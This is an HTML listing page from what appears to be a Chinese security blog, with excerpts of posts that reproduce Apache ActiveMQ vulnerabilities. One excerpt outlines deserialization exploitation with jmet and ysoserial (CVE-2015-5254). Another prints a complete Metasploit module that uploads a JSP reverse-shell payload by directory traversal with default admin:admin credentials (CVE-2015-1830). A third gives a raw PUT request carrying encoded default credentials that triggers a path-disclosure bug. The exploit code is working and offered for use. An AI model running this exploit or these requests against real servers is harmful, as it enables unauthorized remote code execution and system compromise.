        <a data-url="https://she11c0de.github.io/2022/07/07/ActiveMQ/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlgw000sy8v11vo2czcp" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-ActiveMQ/（CVE-2015-5254）ActiveMQ 反序列化漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/ActiveMQ/%EF%BC%88CVE-2015-5254%EF%BC%89ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:51.828Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2015-5254）ActiveMQ-反序列化漏洞"><a href="#（CVE-2015-5254）ActiveMQ-反序列化漏洞" class="headerlink" title="（CVE-2015-5254）ActiveMQ 反序列化漏洞"></a>（CVE-2015-5254）ActiveMQ 反序列化漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Apache ActiveMQ<br>5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java<br>Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache ActiveMQ 5.13.0之前的5.x版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞利用过程如下：</p>
<ol>
<li><p> 构造（可以使用ysoserial）可执行命令的序列化对象</p>
</li>
<li><p> 作为一个消息，发送给目标61616端口</p>
</li>
<li><p> 访问web管理页面，读取消息，触发漏洞</p>
</li>
</ol>
<p>使用<a target="_blank" rel="noopener" href="https://github.com/ianxtianxt/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。</p>
<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
        
          <p class="article-more-link">
            <a href="/2022/07/07/ActiveMQ/%EF%BC%88CVE-2015-5254%EF%BC%89ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/ActiveMQ/%EF%BC%88CVE-2015-5254%EF%BC%89ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlgw000ry8v16i1c6bvf" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-ActiveMQ/（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/ActiveMQ/%EF%BC%88CVE-2015-1830%EF%BC%89ActiveMQ%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E5%AF%BC%E8%87%B4%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84rce/" class="article-date">
  <time datetime="2022-07-08T06:25:51.826Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2015-1830）ActiveMQ-路径遍历导致未经身份验证的rce"><a href="#（CVE-2015-1830）ActiveMQ-路径遍历导致未经身份验证的rce" class="headerlink" title="（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce"></a>（CVE-2015-1830）ActiveMQ 路径遍历导致未经身份验证的rce</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>Windows 5.11.2之前的Apache ActiveMQ<br>5.x中blob消息的文件服务器上载/下载功能中的目录遍历漏洞允许远程攻击者通过未指定的向量在任意目录中创建JSP文件。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>ActiveMQ 5.11.1</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="msf-poc"><a href="#msf-poc" class="headerlink" title="msf poc"></a>msf poc</h3><blockquote>
<p>直接在msf里面搜索就行了，如果没有请更新msf版本，或者手动复制下面的脚本到msf目录下。</p>
</blockquote>
<pre><code>##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule &lt; Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = &#123;&#125;)
    super(update_info(info,
      &#39;Name&#39;           =&gt; &#39;Apache ActiveMQ 5.x-5.11.1 Directory Traversal Shell Upload&#39;,
      &#39;Description&#39;    =&gt; %q&#123;
        This module exploits a directory traversal vulnerability (CVE-2015-1830) in Apache
        ActiveMQ 5.x before 5.11.2 for Windows.

        The module tries to upload a JSP payload to the /admin directory via the traversal
        path /fileserver/..\\admin\\ using an HTTP PUT request with the default ActiveMQ
        credentials admin:admin (or other credentials provided by the user). It then issues
        an HTTP GET request to /admin/&lt;payload&gt;.jsp on the target in order to trigger the
        payload and obtain a shell.
      &#125;,
      &#39;Author&#39;          =&gt;
        [
          &#39;David Jorm&#39;,     # Discovery and exploit
          &#39;Erik Wynter&#39;     # @wyntererik - Metasploit
        ],
      &#39;References&#39;     =&gt;
        [
          [ &#39;CVE&#39;, &#39;2015-1830&#39; ],
          [ &#39;EDB&#39;, &#39;40857&#39;],
          [ &#39;URL&#39;, &#39;https://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt&#39; ]
        ],
      &#39;Privileged&#39;     =&gt; false,
      &#39;Platform&#39;    =&gt; %w&#123; win &#125;,
      &#39;Targets&#39;     =&gt;
        [
          [ &#39;Windows Java&#39;,
            &#123;
              &#39;Arch&#39; =&gt; ARCH_JAVA,
              &#39;Platform&#39; =&gt; &#39;win&#39;
            &#125;
          ],
        ],
      &#39;DisclosureDate&#39; =&gt; &#39;2015-08-19&#39;,
      &#39;License&#39;        =&gt; MSF_LICENSE,
      &#39;DefaultOptions&#39;  =&gt; &#123;
        &#39;RPORT&#39; =&gt; 8161,
        &#39;PAYLOAD&#39; =&gt; &#39;java/jsp_shell_reverse_tcp&#39;
        &#125;,
      &#39;DefaultTarget&#39;  =&gt; 0))

    register_options([
      OptString.new(&#39;TARGETURI&#39;, [true, &#39;The base path to the web application&#39;, &#39;/&#39;]),
      OptString.new(&#39;PATH&#39;,      [true, &#39;Traversal path&#39;, &#39;/fileserver/..\\admin\\&#39;]),
      OptString.new(&#39;USERNAME&#39;, [true, &#39;Username to authenticate with&#39;, &#39;admin&#39;]),
      OptString.new(&#39;PASSWORD&#39;, [true, &#39;Password to authenticate with&#39;, &#39;admin&#39;])
    ])
  end

  def check
    print_status(&quot;Running check...&quot;)
    testfile = Rex::Text::rand_text_alpha(10)
    testcontent = Rex::Text::rand_text_alpha(10)

    send_request_cgi(&#123;
      &#39;uri&#39;       =&gt; normalize_uri(target_uri.path, datastore[&#39;PATH&#39;], &quot;#&#123;testfile&#125;.jsp&quot;),
      &#39;headers&#39;     =&gt; &#123;
        &#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])
        &#125;,
      &#39;method&#39;    =&gt; &#39;PUT&#39;,
      &#39;data&#39;      =&gt; &quot;&lt;% out.println(\&quot;#&#123;testcontent&#125;\&quot;);%&gt;&quot;
    &#125;)

    res1 = send_request_cgi(&#123;
      &#39;uri&#39;       =&gt; normalize_uri(target_uri.path,&quot;admin/#&#123;testfile&#125;.jsp&quot;),
      &#39;headers&#39;     =&gt; &#123;
        &#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])
        &#125;,
      &#39;method&#39;    =&gt; &#39;GET&#39;
    &#125;)

    if res1 &amp;&amp; res1.body.include?(testcontent)
      send_request_cgi(
        opts = &#123;
          &#39;uri&#39;       =&gt; normalize_uri(target_uri.path,&quot;admin/#&#123;testfile&#125;.jsp&quot;),
          &#39;headers&#39;     =&gt; &#123;
            &#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])
            &#125;,
          &#39;method&#39;    =&gt; &#39;DELETE&#39;
        &#125;,
        timeout = 1
      )
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status(&quot;Uploading payload...&quot;)
    testfile = Rex::Text::rand_text_alpha(10)
    vprint_status(&quot;If upload succeeds, payload will be available at #&#123;target_uri.path&#125;admin/#&#123;testfile&#125;.jsp&quot;) #This information is provided to allow for manual execution of the payload in case the upload is successful but the GET request issued by the module fails.

    send_request_cgi(&#123;
      &#39;uri&#39;       =&gt; normalize_uri(target_uri.path, datastore[&#39;PATH&#39;], &quot;#&#123;testfile&#125;.jsp&quot;),
      &#39;headers&#39;     =&gt; &#123;
        &#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])
        &#125;,
      &#39;method&#39;    =&gt; &#39;PUT&#39;,
      &#39;data&#39;      =&gt; payload.encoded
    &#125;)

    print_status(&quot;Payload sent. Attempting to execute the payload.&quot;)
    res = send_request_cgi(&#123;
      &#39;uri&#39;       =&gt; normalize_uri(target_uri.path,&quot;admin/#&#123;testfile&#125;.jsp&quot;),
      &#39;headers&#39;     =&gt; &#123;
        &#39;Authorization&#39; =&gt; basic_auth(datastore[&#39;USERNAME&#39;], datastore[&#39;PASSWORD&#39;])
      &#125;,
      &#39;method&#39;    =&gt; &#39;GET&#39;
    &#125;)
    if res &amp;&amp; res.code == 200
      print_good(&quot;Payload executed!&quot;)
    else
      fail_with(Failure::PayloadFailed, &quot;Failed to execute the payload&quot;)
    end
  end
end
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/ActiveMQ/%EF%BC%88CVE-2015-1830%EF%BC%89ActiveMQ%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E5%AF%BC%E8%87%B4%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84rce/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/ActiveMQ/%EF%BC%88CVE-2015-1830%EF%BC%89ActiveMQ%20%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E5%AF%BC%E8%87%B4%E6%9C%AA%E7%BB%8F%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%9A%84rce/" data-id="cl5c2qlgv000qy8v10swn5c33" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  

    
    <article id="post-ActiveMQ/ActiveMQ物理路径泄漏漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/ActiveMQ/ActiveMQ%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:51.824Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="ActiveMQ物理路径泄漏漏洞"><a href="#ActiveMQ物理路径泄漏漏洞" class="headerlink" title="ActiveMQ物理路径泄漏漏洞"></a>ActiveMQ物理路径泄漏漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><pre><code>Request Raw:
PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1
Host: 192.168.197.25:8161
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: 4
</code></pre>

        
          <p class="article-more-link">
            <a href="/2022/07/07/ActiveMQ/ActiveMQ%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/#more">......</a>
          </p>
        
      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/ActiveMQ/ActiveMQ%E7%89%A9%E7%90%86%E8%B7%AF%E5%BE%84%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlgu000py8v18df3dj5r" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
</article>


    
  
  
    <nav id="page-nav">
      <a class="extend prev" rel="prev" href="/page/98/">上一页</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/97/">97</a><a class="page-number" href="/page/98/">98</a><span class="page-number current">99</span><a class="page-number" href="/page/100/">100</a><a class="page-number" href="/page/101/">101</a><a class="extend next" rel="next" href="/page/100/">下一页</a>
    </nav>
  
</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>